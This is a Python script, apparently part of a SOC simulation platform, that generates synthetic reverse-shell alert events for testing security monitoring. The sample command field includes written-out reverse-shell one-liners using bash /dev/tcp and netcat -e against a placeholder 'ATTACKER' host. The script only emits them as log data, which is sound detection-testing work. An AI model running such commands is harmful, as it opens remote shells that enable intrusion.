# =========================================================
# REVERSE SHELL ATTACK SCENARIO
# SOC-IAC PLATFORM
# =========================================================

import random
import uuid
from datetime import datetime

# =========================================================
# SAMPLE DATA
# =========================================================

SOURCE_IPS = [
    "192.168.1.77",
    "10.10.10.45",
    "172.16.1.22"
]

DESTINATION_IPS = [
    "185.220.101.1",
    "45.33.32.156",
    "91.134.182.120"
]

SHELL_TYPES = [
    "bash",
    "powershell",
    "netcat",
    "python"
]

# =========================================================
# GENERATE REVERSE SHELL EVENT
# =========================================================

def generate_reverse_shell():

    shell_type = random.choice(SHELL_TYPES)

    event = {

        "event_id": str(uuid.uuid4()),

        "timestamp": datetime.utcnow().isoformat(),

        "event_type": "reverse_shell",

        "src_ip": random.choice(SOURCE_IPS),

        "dest_ip": random.choice(DESTINATION_IPS),

        "src_port": random.randint(1024, 65535),

        "dest_port": random.choice([
            4444,
            5555,
            6666,
            1337
        ]),

        "severity": "critical",

        "mitre": "T1059",

        "message": "Simulated reverse shell activity detected",

        "shell_type": shell_type,

        "command": random.choice([
            "bash -i >& /dev/tcp/ATTACKER/4444 0>&1",
            "nc -e /bin/bash ATTACKER 4444",
            "powershell -nop -c Invoke-Shell",
            "python -c socket reverse shell"
        ]),

        "process_name": shell_type,

        "connection_duration": random.randint(120, 2000),

        "protocol": "TCP",

        "country": random.choice([
            "Russia",
            "China",
            "Iran"
        ]),

        "tags": [
            "reverse_shell_detected",
            "critical_attack",
            "possible_reverse_shell"
        ]

    }

    return event

# =========================================================
# STANDALONE TEST
# =========================================================

if __name__ == "__main__":

    import json

    print(json.dumps(generate_reverse_shell(), indent=4))